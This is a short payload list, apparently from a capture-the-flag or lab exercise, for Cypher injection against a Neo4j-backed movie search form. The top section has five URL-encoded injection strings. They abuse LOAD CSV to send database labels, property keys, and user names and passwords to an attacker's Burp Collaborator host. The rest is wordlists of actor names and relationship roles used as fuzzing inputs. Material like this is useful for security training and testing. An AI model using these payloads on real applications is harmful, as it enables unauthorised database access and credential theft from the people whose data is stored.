BONUS payloads (replace ```your.burpcollaboratorurl.com``` with correct URL)

```
  person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
  person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
  person=Tom+Tykwer"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.password+AS+r+return+person,role,movie//&role=DIRECTED&search=go
  person=Tom+Cruise"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.password+AS+r+return+person,role,movie//&role=DIRECTED&search=go
  person=Tom+Skerritt"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.password+AS+r+return+person,role,movie//&role=DIRECTED&search=go
```

Persons Payloads
  
```
  Keanu Reeves
  Carrie-Anne Moss
  Laurence Fishburne
  Hugo Weaving
  Lilly Wachowski
  Lana Wachowski
  Joel Silver
  Emil Eifrem
  Charlize Theron
  Al Pacino
  Taylor Hackford
  Tom Cruise
  Jack Nicholson
  Demi Moore
  Kevin Bacon
  Kiefer Sutherland
  Noah Wyle
  Cuba Gooding Jr.
  Kevin Pollak
  J.T. Walsh
  James Marshall
  Christopher Guest
  Rob Reiner
  Aaron Sorkin
  Kelly McGillis
  Val Kilmer
  Anthony Edwards
  Tom Skerritt
  Meg Ryan
  Tony Scott
  Jim Cash
  Renee Zellweger
  Kelly Preston
  Jerry O'Connell
  Jay Mohr
  Bonnie Hunt
  Regina King
  Jonathan Lipnicki
  Cameron Crowe
  River Phoenix
  Corey Feldman
  Wil Wheaton
  John Cusack
  Marshall Bell
  Helen Hunt
  Greg Kinnear
  James L. Brooks
  Annabella Sciorra
  Max von Sydow
  Werner Herzog
  Robin Williams
  Vincent Ward
  Ethan Hawke
  Rick Yune
  James Cromwell
  Scott Hicks
  Parker Posey
  Dave Chappelle
  Steve Zahn
  Tom Hanks
  Nora Ephron
  Rita Wilson
  Bill Pullman
  Victor Garber
  Rosie O'Donnell
  John Patrick Stanley
  Nathan Lane
  Billy Crystal
  Carrie Fisher
  Bruno Kirby
  Liv Tyler
  Brooke Langton
  Gene Hackman
  Orlando Jones
  Howard Deutch
  Christian Bale
  Zach Grenier
  Mike Nichols
  Richard Harris
  Clint Eastwood
  Takeshi Kitano
  Dina Meyer
  Ice-T
  Robert Longo
  Halle Berry
  Jim Broadbent
  Tom Tykwer
  David Mitchell
  Stefan Arndt
  Ian McKellen
  Audrey Tautou
  Paul Bettany
  Ron Howard
  Natalie Portman
  Stephen Rea
  John Hurt
  Ben Miles
  Emile Hirsch
  John Goodman
  Susan Sarandon
  Matthew Fox
  Christina Ricci
  Rain
  Naomie Harris
  Michael Clarke Duncan
  David Morse
  Sam Rockwell
  Gary Sinise
  Patricia Clarkson
  Frank Darabont
  Frank Langella
  Michael Sheen
  Oliver Platt
  Danny DeVito
  John C. Reilly
  Ed Harris
  Bill Paxton
  Philip Seymour Hoffman
  Jan de Bont
  Robert Zemeckis
  Milos Forman
  Diane Keaton
  Nancy Meyers
  Chris Columbus
  Julia Roberts
  Madonna
  Geena Davis
  Lori Petty
  Penny Marshall
  Paul Blythe
  Angela Scope
  Jessica Thompson
  James Thompson
```

Roles Payloads

```
  ACTED_IN
  DIRECTED
  PRODUCED
  WROTE
  IS_A
```
